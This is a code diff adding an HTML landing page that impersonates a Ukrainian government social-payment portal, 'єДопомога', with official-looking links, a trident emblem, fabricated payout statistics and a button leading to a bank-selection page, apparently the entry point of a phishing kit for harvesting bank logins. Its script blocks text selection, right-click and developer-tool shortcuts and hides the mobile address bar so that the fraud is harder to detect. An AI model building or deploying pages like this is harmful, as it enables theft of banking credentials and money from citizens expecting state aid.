@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Державний портал — єДопомога</title>
+    <link rel="stylesheet" href="main.css">
+    <style>
+        /* Дополнительная защита: запрет выделения текста */
+        body {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+    <div class="gov-line">
+        <div class="container flex-header">
+            <div class="brand">
+                <svg class="trizub" viewBox="0 0 167 250">
+                    <path d="M83.5 0L83.5 204M83.5 0C83.5 0 35 15 35 78V145C35 180 65 205 83.5 205M83.5 0C83.5 0 132 15 132 78V145C132 180 102 205 83.5 205M35 110L5 110V145C5 210 83.5 250 83.5 250M132 110L162 110V145C162 210 83.5 250 83.5 250" stroke="#FFD700" stroke-width="12" fill="none"/>
+                </svg>
+                <a href="https://www.msp.gov.ua/" target="_blank" class="gov-link-top">Міністерство соціальної політики України</a>
+            </div>
+            <div class="top-nav">
+                <a href="https://www.gov.ua/" target="_blank">Урядовий портал</a>
+                <span class="sep">|</span>
+                <a href="https://diia.gov.ua/" target="_blank">Дія</a>
+            </div>
+        </div>
+    </div>
+
+    <main class="container">
+        <nav class="main-nav">
+            <div class="logo-text">є<span>Допомога</span></div>
+            <div class="live-indicator">
+                <div class="pulse"></div>
+                <span>Система працює: <b id="current-date"></b></span>
+            </div>
+        </nav>
+
+        <section class="hero">
+            <div class="content-box">
+                <div class="info-badge">Офіційна програма виплат</div>
+                <h1>Соціальна підтримка <br>громадян України</h1>
+                <p>За підтримки Кабінету Міністрів України та міжнародних організацій запущено процес автоматизованої виплати допомоги через платформу <b>єДопомога</b>.</p>
+
+                <div class="stats-row">
+                    <div class="stat-card">
+                        <span class="stat-label">Отримали виплату сьогодні:</span>
+                        <span class="stat-value" id="people-count">14,284</span>
+                    </div>
+                    <div class="stat-card">
+                        <span class="stat-label">Виплачено коштів (грн):</span>
+                        <span class="stat-value" id="money-sum">92,846,000</span>
+                    </div>
+                </div>
+
+                <div class="verify-steps">
+                    <div class="step"><span>01</span> Авторизація</div>
+                    <div class="step"><span>02</span> Перевірка</div>
+                    <div class="step"><span>03</span> Виплата</div>
+                </div>
+
+                <a href="banks.html" class="btn-primary">Оформити грошову допомогу</a>
+
+                <div class="security-notif">
+                    Верифікація здійснюється через <a href="https://id.nbu.gov.ua/" target="_blank">BankID НБУ</a>
+                </div>
+            </div>
+        </section>
+
+        <section class="partners">
+            <p>Інформаційні ресурси:</p>
+            <div class="partners-grid">
+                <a href="https://diia.gov.ua/" target="_blank" class="partner-item">Дія</a>
+                <a href="https://www.nbu.gov.ua/" target="_blank" class="partner-item">НБУ</a>
+                <a href="https://www.unicef.org/ukraine/" target="_blank" class="partner-item">UNICEF</a>
+                <a href="https://www.ukrposhta.ua/" target="_blank" class="partner-item">Укрпошта</a>
+            </div>
+        </section>
+    </main>
+
+    <script>
+        // Блокировка клавиш разработки (F12, Ctrl+Shift+I, Ctrl+U)
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123) return false;
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) return false;
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
+            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+        };
+
+        // Скрытие адресной строки на мобильных
+        window.addEventListener("load", function() {
+            setTimeout(function() {
+                window.scrollTo(0, 1);
+            }, 0);
+        });
+    </script>
+    <script src="script.js"></script>
+</body>
+</html>
